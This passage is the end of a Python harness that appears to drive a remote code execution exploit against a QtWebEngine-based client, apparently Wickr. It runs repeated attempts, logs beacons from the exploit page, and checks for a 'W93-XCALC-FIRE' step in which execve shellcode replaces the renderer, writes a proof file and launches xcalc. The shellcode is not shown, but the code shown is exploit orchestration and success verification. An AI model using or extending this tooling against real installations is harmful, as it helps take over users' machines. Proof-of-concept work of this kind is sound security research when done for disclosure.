            try: qt.kill()
            except: pass
            subprocess.run(["pkill", "-9", "-f", "QtWebEngineProcess"], capture_output=True, timeout=5)
            try: srv.shutdown()
            except: pass
            try: srv.server_close()
            except: pass
            time.sleep(1); continue

        t0 = time.time()
        while time.time() - t0 < 60:
            if qt.poll() is not None: break
            if any(b.get("step") in ("W92-DONE", "W92-ERR", "W93-XCALC-FIRE") for b in beacons):
                time.sleep(0.5); break
            time.sleep(0.2)

        try: qt.kill()
        except: pass
        subprocess.run(["pkill", "-9", "-f", "QtWebEngineProcess"], capture_output=True, timeout=5)
        try: srv.shutdown()
        except: pass
        try: srv.server_close()
        except: pass

        out = f"/tmp/w92-recon-{PORT}-{attempt}.log"
        with open(out, "w") as f:
            for b in beacons:
                f.write(json.dumps(b) + "\n")
        print(f"[attempt {attempt}] beacons saved to {out}", flush=True)

        # xcalc: the fire (probe_mget -> execve shellcode) replaces the renderer
        # with the wrapper, which writes /tmp/wickr_rce_proof.txt then execs xcalc.
        # Primary signal = the proof file (pgrep is false-positive prone).
        if any(b.get("step") == "W93-XCALC-FIRE" for b in beacons):
            time.sleep(2.5)
            proof = ""
            try:
                with open("/tmp/wickr_rce_proof.txt") as pf: proof = pf.read().strip()
            except Exception: pass
            print(f"\n[attempt {attempt}] XCALC FIRED — see {out}", flush=True)
            print(f"  proof file: {proof!r}", flush=True)
            if "WICKR-RCE-PROOF" in proof:
                saw_recon = True
                print("*** XCALC ACHIEVED via page-side execve (Goal §1-2 complete) ***", flush=True)
            break
        time.sleep(1)

    if saw_recon:
        return 0
    print("\nRECON FAILED — no W92-DONE. Check /tmp/w92-recon-*.log", flush=True)
    return 2


if __name__ == "__main__":
    sys.exit(main())
